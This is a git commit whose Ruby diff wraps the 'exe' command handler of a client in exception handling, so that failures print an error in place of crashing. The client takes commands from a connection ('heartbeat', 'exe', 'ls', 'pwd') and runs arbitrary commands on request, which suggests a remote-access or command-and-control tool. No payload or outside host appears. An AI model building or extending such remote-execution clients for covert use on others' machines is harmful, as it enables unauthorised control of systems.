be5cee1ae7f72254540111cf63feec24db5d6b0b
chr0x6d <chr0@tutanota.com>
2021-04-19 20:50:11 +0100

    Fix exe command crashing client

--- client/client.rb
+++ client/client.rb
@@ -12,7 +12,12 @@ def handle_client(client)
     when 'heartbeat'
       result = 'alive'
     when 'exe'
-      result = Helpers.exe(data.gsub('exe ', ''))
+      begin
+			  result = Helpers.exe(data.gsub('exe ', ''))
+      rescue Exception => e
+        puts e.message
+				puts e.backtrace
+      end
     when 'ls'
       result = Helpers.ls
     when 'pwd'
